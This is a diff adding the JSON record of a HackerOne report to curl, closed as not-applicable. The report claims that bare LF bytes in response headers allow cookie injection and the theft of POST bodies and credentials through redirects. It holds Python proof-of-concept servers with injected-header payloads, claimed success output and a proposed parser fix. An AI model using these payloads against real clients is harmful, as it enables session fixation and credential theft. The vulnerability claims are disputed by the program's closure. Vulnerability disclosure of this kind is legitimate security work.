@@ -1,0 +1,138 @@
+{
+  "id": 3785919,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzg1OTE5",
+  "url": "https://hackerone.com/reports/3785919",
+  "title": "libcurl: HTTP/1.x bare LF byte in response header value enables cookie jar pollution and POST body/credential exfiltration via redirect — RC=0, curl 8",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "high",
+  "readable_substate": "N/A",
+  "created_at": "2026-06-06T11:38:11.055Z",
+  "submitted_at": "2026-06-06T11:38:12.398Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "torkd1",
+    "url": "/torkd1",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-08T06:30:49.484Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-07T12:33:51.100Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Summary\ncurl's HTTP/1.x response header parser splits header lines using a single memchr(buf, '\\n', blen) call (lib/http.c:4457), with no awareness of whether the current position is inside a quoted-string value. A server response containing any header field whose value embeds a raw LF byte (\\x0a) causes the parser to create synthetic new header lines from the bytes following that LF.\nThis single-byte injection enables two independent attacks confirmed locally on curl 8.20.0 (Android aarch64, 2026-04-29):\nAttack A — Cookie jar pollution (requires -c / --cookie-jar): Any bytes forming Set-Cookie: ... are silently written to curl's cookie jar. RC=0, no warning.\nAttack B — POST body and credential exfiltration via redirect (requires -L / --location): Any bytes forming Location: http://... are treated as a valid redirect target. With a 307/308 response, the full POST body is forwarded to the attacker's target. With --location-trusted, the Authorization header is also forwarded.\nBoth attacks share the same root cause and the same patch. RC=0 in all cases. No existing CVE covers either vector.\nNote: AI assistance was used in drafting and structuring this report. All technical claims were independently verified by running the PoCs on curl 8.20.0 (aarch64-unknown-linux-android, Release-Date: 2026-04-29).\nSteps To Reproduce\nEnvironment\ncurl 8.20.0 (aarch64-unknown-linux-android)\nlibcurl/8.20.0 OpenSSL/3.6.2 zlib/1.3.2\nRelease-Date: 2026-04-29\nPython 3.x\nAttack A — Cookie Jar Pollution\nSave as attack_a.py and run python3 attack_a.py:\n#!/usr/bin/env python3\nimport socket, threading, subprocess, tempfile, time, os\n\nPORT = 19811\n\ndef server():\n    payload = (\n        b'HTTP/1.1 200 OK\\r\\n'\n        b'Authentication-Info: nextnonce=\"val\\n'\n        b'Set-Cookie: session=ATTACKER_INJECTED; Path=/\\r\\n'\n        b'X-Absorb: \"\\r\\n'\n        b'Content-Length: 5\\r\\n\\r\\nhello'\n    )\n    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind(('127.0.0.1', PORT)); s.listen(1); s.settimeout(10)\n    conn, _ = s.accept(); conn.recv(4096)\n    conn.sendall(payload); time.sleep(0.2); conn.close(); s.close()\n\njar = tempfile.mktemp(suffix='.jar')\nopen(jar, 'w').close()\nthreading.Thread(target=server, daemon=True).start()\ntime.sleep(0.1)\nresult = subprocess.run(['curl', '-s', '-c', jar, f'http://127.0.0.1:{PORT}/'],\n                        capture_output=True)\nprint(f'RC: {result.returncode}')\nprint(open(jar).read())\nos.unlink(jar)\nConfirmed output (curl 8.20.0):\nRC: 0\n# Netscape HTTP Cookie File\n127.0.0.1    FALSE    /    FALSE    0    session    ATTACKER_INJECTED\nAttack A — CI/CD Pipeline Compromise (end-to-end)\n#!/usr/bin/env python3\nimport socket, threading, subprocess, tempfile, time, json, os\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\ndef attacker_server(port):\n    payload = (\n        b'HTTP/1.1 200 OK\\r\\n'\n        b'Content-Type: application/json\\r\\n'\n        b'Authentication-Info: nextnonce=\"refresh\\n'\n        b'Set-Cookie: ci_session=ATTACKER_FIXED_TOKEN; Path=/; Domain=127.0.0.1\\n'\n        b'X-Pad: \"\\r\\n'\n        b'Content-Length: 18\\r\\n\\r\\n{\"status\":\"ready\"}'\n    )\n    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind(('127.0.0.1', port)); s.listen(5); s.settimeout(10)\n    for _ in range(3):\n        try:\n            c, _ = s.accept(); c.recv(4096); c.sendall(payload)\n            time.sleep(0.1); c.close()\n        except: pass\n    s.close()\n\nreceived = []\nclass InternalAPI(BaseHTTPRequestHandler):\n    def log_message(self, *a): pass\n    def do_GET(self):\n        cookie = self.headers.get('Cookie', '')\n        received.append(cookie)\n        status = 'COMPROMISED' if 'ATTACKER_FIXED_TOKEN' in cookie else 'ok'\n        body = json.dumps({'status': status}).encode()\n        self.send_response(200)\n        self.send_header('Content-Length', str(len(body)))\n        self.end_headers(); self.wfile.write(body)\n\njar = tempfile.mktemp(suffix='.jar')\nopen(jar, 'w').close()\n\napi_srv = HTTPServer(('127.0.0.1', 19902), InternalAPI)\nthreading.Thread(target=api_srv.serve_forever, daemon=True).start()\nthreading.Thread(target=attacker_server, args=(19901,), daemon=True).start()\ntime.sleep(0.2)\n\nr1 = subprocess.run(['curl', '-s', '-c', jar, '-b', jar,\n                     'http://127.0.0.1:19901/package.json'], capture_output=True, text=True)\nprint(f'External fetch RC={r1.returncode}: {r1.stdout.strip()}')\n\nr2 = subprocess.run(['curl', '-s', '-c', jar, '-b', jar,\n                     'http://127.0.0.1:19902/api/jobs/trigger'], capture_output=True, text=True)\nprint(f'CI API response: {r2.stdout}')\n\napi_srv.shutdown(); os.unlink(jar)\nConfirmed output (curl 8.20.0):\nRESULT: ATTACK SUCCESSFUL\nCookie \"ci_session=ATTACKER_FIXED_TOKEN\" injected by external server, sent to internal CI API.\nCI/CD response: COMPROMISED\nAttack B — POST Body + Bearer Token Exfiltration via 307\n#!/usr/bin/env python3\nimport socket, threading, subprocess, time\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\ncaptured = []\nclass Capture(BaseHTTPRequestHandler):\n    def log_message(self, *a): pass\n    def do_POST(self):\n        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))\n        captured.append({'auth': self.headers.get('Authorization'), 'body': body})\n        self.send_response(200); self.end_headers(); self.wfile.write(b'CAPTURED')\n\ncap_srv = HTTPServer(('127.0.0.1', 19821), Capture)\nthreading.Thread(target=cap_srv.serve_forever, daemon=True).start()\n\ndef attacker_307(port):\n    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s.bind(('127.0.0.1', port)); s.listen(1); s.settimeout(6)\n    conn, _ = s.accept(); conn.recv(4096)\n    conn.sendall(\n        b'HTTP/1.1 307 Temporary Redirect\\r\\n'\n        b'X-Rate-Limit: \"100\\n'\n        b'Location: http://127.0.0.1:19821/steal\\n'\n        b'X-Absorb: \"\\r\\n'\n        b'Content-Length: 0\\r\\n\\r\\n'\n    )\n    time.sleep(0.1); conn.close(); s.close()\n\nthreading.Thread(target=attacker_307, args=(19820,), daemon=True).start()\ntime.sleep(0.2)\n\nsubprocess.run([\n    'curl', '-s', '-L', '--location-trusted', '-X', 'POST',\n    '-H', 'Authorization: Bearer VICTIM_TOKEN',\n    '-H', 'Content-Type: application/json',\n    '-d', '{\"api_key\": \"PROD_KEY_12345\"}',\n    '--max-time', '4', 'http://127.0.0.1:19820/api/deploy'\n], timeout=6)\n\ntime.sleep(0.2)\ncap_srv.shutdown()\n\nif captured:\n    print(f'Body stolen: {captured[0][\"body\"]}')\n    print(f'Auth stolen: {captured[0][\"auth\"]}')\nelse:\n    print('Attack B did not reproduce')\nConfirmed output (curl 8.20.0):\nBody stolen: b'{\"api_key\": \"PROD_KEY_12345\"}'\nAuth stolen: Bearer VICTIM_TOKEN\nRoot Cause\nFile: lib/http.c\nFunction: http_rw_headers()\nVulnerable line (~4457):\nend_ptr = memchr(buf, '\\n', blen);\nThis finds the next \\n byte to delimit a header line with no check for whether the parser is inside a quoted-string value (RFC 7230 §3.2.6). A header value such as Authentication-Info: nextnonce=\"val\\n causes the parser to split on the embedded \\n, treating everything after it as a new header line.\n\n## Impact\n\nImpact\nConfirmed locally on curl 8.20.0:\nAttack A — Cookie jar:\nCookie jar pollution, RC=0, no warning ✅\nSession fixation ✅\nCI/CD pipeline compromise via shared cookie jar ✅\nAttack B — Redirect:\nPOST body exfiltrated to attacker via LF-injected Location ✅\nBearer token exfiltrated with --location-trusted ✅\nRC=0, no warning in both cases ✅\nCombined attack scenario:\ncurl -L --location-trusted -X POST \\\n  -H 'Authorization: Bearer PROD_TOKEN' \\\n  -d '{\"action\":\"deploy\",\"env\":\"production\"}' \\\n  https://cdn.vendor.com/sdk/latest.json\n\nAttacker's server responds with LF-injected Location → curl forwards\nPOST body + Bearer token to attacker silently. RC=0.\nSuggested Fix\nbool in_quote = false;\nconst char *end_ptr = NULL;\nfor (size_t i = 0; i < blen; i++) {\n    if (buf[i] == '\"' && (i == 0 || buf[i-1] != '\\\\'))\n        in_quote = !in_quote;\n    if (buf[i] == '\\n' && !in_quote) {\n        end_ptr = buf + i;\n        break;\n    }\n}\nAlternative: reject any \\n byte inside a header field value per RFC 7230 §3.2.6.",
+  "weakness": {
+    "id": 1,
+    "name": "HTTP Response Splitting"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6049657,
+      "file_name": "IMG_20260606_060634.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j166qcflkpv21b3giigfhcmfaj49?response-content-disposition=attachment%3B%20filename%3D%22IMG_20260606_060634.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20260606_060634.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQOAR2CTW%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T074116Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDNu9rxiArx8c2v%2FhHCEGCY9wvCTRLW50U%2FgbzAETfAKQIgY3Xg4iTUBvyc2P4tWyysXtLkvH7L2xCRHQ2GwAjkk58quwUIsP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJcOZCJQyWSGBrGvLyqPBaLUPswT2CXmPrNhpubHg5GDC1u2ynKdwUhAyGYcw%2BZ%2BemrTm5O2LGpsozQBIftWR%2Fn7PJTBuQSqN97Kaq245GT22H%2Bu%2F%2Fk67LzAbONmov9kcdQQk7XJCrlaXsvcpOGjLDNchZNx6sturrEI91j%2BbP7uatSpHs7rejg2nZ2%2BnTXzoYHXPY8irNgkiw5eowy3pVSpN%2FduDPzhFAw9zqF6%2F%2BF4Uznm86hSiBzJDsAevWbqvjRaS5ZkB9gJptBwK9%2FkwaZsZc7MLPYqF0ppXznqZuZxx%2BRmlynJ3g%2By83JdEWROxw5CF85XK7VkvJmaB4vMUwVuEEvJPDRqhqi7e6ktVO9%2FCaewOyVVdGSpzpNHh7AX3rln8nqLeHtnh0QNce289m4%2B%2BrSuhvRvx8eWFZQ6o4ZevijaKXKU6s74rI%2F5Gx%2BWte42Hnni1l3j1HH0EMy1zNahv3dibrilNSFPWHBW6ncnK%2FF3nkuipoQ%2FubdseeYdqWmwCMB%2FuJ%2FmNN15S3DkaiZo9u2GVtHD00%2FAgabX82wG193e3PEghBwX%2F6oCLk9weDgwtL7JQ67Mk2WXRfHq7%2BuqzqEibfme6CBEr3XqMM5%2FhxDz%2BMDYxSjYuQAUzEr7tcaMs6wGWu1DsrN1IxcveFnPhXhCDZbcpF5ox7nAdeWLfOUUQadYlzEgw%2F01qPJdIkl8A%2B2e9CIwPzBdPmnV4%2B9UQ%2FlKgAePwViH74hD5prCBR6ULn97ZH0YbCicblqRtTBEbBhuLanvPNxpqvJlC7j1FKA88%2FugEzIiowoGlSeYFh62Lo2n%2FobF7XUIxDZYbzlbL69%2B2nHLp5nBWNUApkQG3wZp4CL01GypMN9o3nlHJ4JV1pDnNfv8l%2FmRkgww8syZ0QY6sQFfPzEOECQMML9StXLgwGdOxEPMei5tv%2BS%2BP8uWPMOGSEF8I%2FxGMLa2f%2BbR2bMLKszN17NLB4aYT05glcmvihyS6v4TOevUxDKnc9TPUkW1fX57XzOlqfHti0hv15qDYvmAGf1865CK1WAJFxCGnk8bCWTubhHLO%2FMc6RoiM2DGnQfemw7ctLjzneLEQ8oV49ytCJyci3ZXITDzQI4LmsKgXPKawunI2zgEx01%2FDB67Xt0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=340e367a5c82aa5e846c5579bfe13dd680f1bc5d5bdaf417343a0a850788db74",
+      "file_size": 56035,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 6049658,
+      "file_name": "IMG_20260606_063650.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xq5lsmffensw2claaerhy2uflxvm?response-content-disposition=attachment%3B%20filename%3D%22IMG_20260606_063650.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20260606_063650.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQOAR2CTW%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T074116Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDNu9rxiArx8c2v%2FhHCEGCY9wvCTRLW50U%2FgbzAETfAKQIgY3Xg4iTUBvyc2P4tWyysXtLkvH7L2xCRHQ2GwAjkk58quwUIsP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJcOZCJQyWSGBrGvLyqPBaLUPswT2CXmPrNhpubHg5GDC1u2ynKdwUhAyGYcw%2BZ%2BemrTm5O2LGpsozQBIftWR%2Fn7PJTBuQSqN97Kaq245GT22H%2Bu%2F%2Fk67LzAbONmov9kcdQQk7XJCrlaXsvcpOGjLDNchZNx6sturrEI91j%2BbP7uatSpHs7rejg2nZ2%2BnTXzoYHXPY8irNgkiw5eowy3pVSpN%2FduDPzhFAw9zqF6%2F%2BF4Uznm86hSiBzJDsAevWbqvjRaS5ZkB9gJptBwK9%2FkwaZsZc7MLPYqF0ppXznqZuZxx%2BRmlynJ3g%2By83JdEWROxw5CF85XK7VkvJmaB4vMUwVuEEvJPDRqhqi7e6ktVO9%2FCaewOyVVdGSpzpNHh7AX3rln8nqLeHtnh0QNce289m4%2B%2BrSuhvRvx8eWFZQ6o4ZevijaKXKU6s74rI%2F5Gx%2BWte42Hnni1l3j1HH0EMy1zNahv3dibrilNSFPWHBW6ncnK%2FF3nkuipoQ%2FubdseeYdqWmwCMB%2FuJ%2FmNN15S3DkaiZo9u2GVtHD00%2FAgabX82wG193e3PEghBwX%2F6oCLk9weDgwtL7JQ67Mk2WXRfHq7%2BuqzqEibfme6CBEr3XqMM5%2FhxDz%2BMDYxSjYuQAUzEr7tcaMs6wGWu1DsrN1IxcveFnPhXhCDZbcpF5ox7nAdeWLfOUUQadYlzEgw%2F01qPJdIkl8A%2B2e9CIwPzBdPmnV4%2B9UQ%2FlKgAePwViH74hD5prCBR6ULn97ZH0YbCicblqRtTBEbBhuLanvPNxpqvJlC7j1FKA88%2FugEzIiowoGlSeYFh62Lo2n%2FobF7XUIxDZYbzlbL69%2B2nHLp5nBWNUApkQG3wZp4CL01GypMN9o3nlHJ4JV1pDnNfv8l%2FmRkgww8syZ0QY6sQFfPzEOECQMML9StXLgwGdOxEPMei5tv%2BS%2BP8uWPMOGSEF8I%2FxGMLa2f%2BbR2bMLKszN17NLB4aYT05glcmvihyS6v4TOevUxDKnc9TPUkW1fX57XzOlqfHti0hv15qDYvmAGf1865CK1WAJFxCGnk8bCWTubhHLO%2FMc6RoiM2DGnQfemw7ctLjzneLEQ8oV49ytCJyci3ZXITDzQI4LmsKgXPKawunI2zgEx01%2FDB67Xt0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f2631e0d07186525e01b8227c78d23a1c2da933d3e05539ecca07b575ce964f",
+      "file_size": 245264,
+      "type": "image/jpeg",
+      "moderated": false
+    },
+    {
+      "id": 6049659,
+      "file_name": "IMG_20260605_224735.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5twepwzrojnle5pk00yb5zd6pzz9?response-content-disposition=attachment%3B%20filename%3D%22IMG_20260605_224735.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_20260605_224735.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQOAR2CTW%2F20260608%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260608T074116Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDNu9rxiArx8c2v%2FhHCEGCY9wvCTRLW50U%2FgbzAETfAKQIgY3Xg4iTUBvyc2P4tWyysXtLkvH7L2xCRHQ2GwAjkk58quwUIsP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJcOZCJQyWSGBrGvLyqPBaLUPswT2CXmPrNhpubHg5GDC1u2ynKdwUhAyGYcw%2BZ%2BemrTm5O2LGpsozQBIftWR%2Fn7PJTBuQSqN97Kaq245GT22H%2Bu%2F%2Fk67LzAbONmov9kcdQQk7XJCrlaXsvcpOGjLDNchZNx6sturrEI91j%2BbP7uatSpHs7rejg2nZ2%2BnTXzoYHXPY8irNgkiw5eowy3pVSpN%2FduDPzhFAw9zqF6%2F%2BF4Uznm86hSiBzJDsAevWbqvjRaS5ZkB9gJptBwK9%2FkwaZsZc7MLPYqF0ppXznqZuZxx%2BRmlynJ3g%2By83JdEWROxw5CF85XK7VkvJmaB4vMUwVuEEvJPDRqhqi7e6ktVO9%2FCaewOyVVdGSpzpNHh7AX3rln8nqLeHtnh0QNce289m4%2B%2BrSuhvRvx8eWFZQ6o4ZevijaKXKU6s74rI%2F5Gx%2BWte42Hnni1l3j1HH0EMy1zNahv3dibrilNSFPWHBW6ncnK%2FF3nkuipoQ%2FubdseeYdqWmwCMB%2FuJ%2FmNN15S3DkaiZo9u2GVtHD00%2FAgabX82wG193e3PEghBwX%2F6oCLk9weDgwtL7JQ67Mk2WXRfHq7%2BuqzqEibfme6CBEr3XqMM5%2FhxDz%2BMDYxSjYuQAUzEr7tcaMs6wGWu1DsrN1IxcveFnPhXhCDZbcpF5ox7nAdeWLfOUUQadYlzEgw%2F01qPJdIkl8A%2B2e9CIwPzBdPmnV4%2B9UQ%2FlKgAePwViH74hD5prCBR6ULn97ZH0YbCicblqRtTBEbBhuLanvPNxpqvJlC7j1FKA88%2FugEzIiowoGlSeYFh62Lo2n%2FobF7XUIxDZYbzlbL69%2B2nHLp5nBWNUApkQG3wZp4CL01GypMN9o3nlHJ4JV1pDnNfv8l%2FmRkgww8syZ0QY6sQFfPzEOECQMML9StXLgwGdOxEPMei5tv%2BS%2BP8uWPMOGSEF8I%2FxGMLa2f%2BbR2bMLKszN17NLB4aYT05glcmvihyS6v4TOevUxDKnc9TPUkW1fX57XzOlqfHti0hv15qDYvmAGf1865CK1WAJFxCGnk8bCWTubhHLO%2FMc6RoiM2DGnQfemw7ctLjzneLEQ8oV49ytCJyci3ZXITDzQI4LmsKgXPKawunI2zgEx01%2FDB67Xt0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13fb4ab1b459963e76d07a79173c566fd589c9950d800068f015cd540a6ca999",
+      "file_size": 269205,
+      "type": "image/jpeg",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "yohana4"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
